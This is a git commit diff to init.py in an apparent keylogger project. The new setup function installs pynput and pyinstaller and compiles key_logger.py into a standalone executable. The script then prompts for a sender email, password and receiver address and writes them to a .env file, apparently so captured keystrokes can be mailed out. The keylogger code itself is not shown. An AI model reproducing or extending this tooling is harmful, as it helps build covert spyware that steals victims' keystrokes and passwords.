9e01903f0bffd3fb95474a1fa29184a12dedbeb2
livinNector <livinnector2001@gmail.com>
2023-03-22 11:57:15 +0530

    changed init.py installing required packages and creating .env file

--- init.py
+++ init.py
@@ -1,26 +1,25 @@
 import os
 
 
-def init(mailid,passwd,rec_mail):
-    with open(r"req/mailsender.py","r+") as file:
-        content=file.read()
-        content=content.replace("mailid",mailid)
-        content=content.replace("rec_mail",rec_mail)
-        content=content.replace("passwd",passwd)
-    with open("newmail.py","a") as file:
-        file.write(content)
-    convert()
+def setup():
+    os.system("pip install pyinstaller")
+    os.system("pip install python-dotenv")
+    os.system("pip install pynput")
+    os.system("pip install tkinter")
+    os.system("pyinstaller --onefile key_logger.py")
 
-def convert():
-    try:
-        os.system("pyinstaller --onefile key_logger.py")
-        # os.system("pyinstaller --onefile newmail.py")
-        pass
-    except:
-        os.system("pip insall pyinstall")
-        convert()
+    
+def create_config(mailid,passwd,rec_mail):
+    with open(".env","w") as f:
+        f.writelines([
+            f"EMAIL={mailid}\n",
+            f"PASSWORD={passwd}\n",
+            f"RECIEVER_MAIL={rec_mail}\n"
+        ])
+    
 
 mailid=input("Enter the sender MailId:")
 passwd=input("Enter the password:")
 rec_mail=input("Enter the reciever Mail:")
-init(mailid,passwd,rec_mail)
+setup()
+create_config(mailid,passwd,rec_mail)
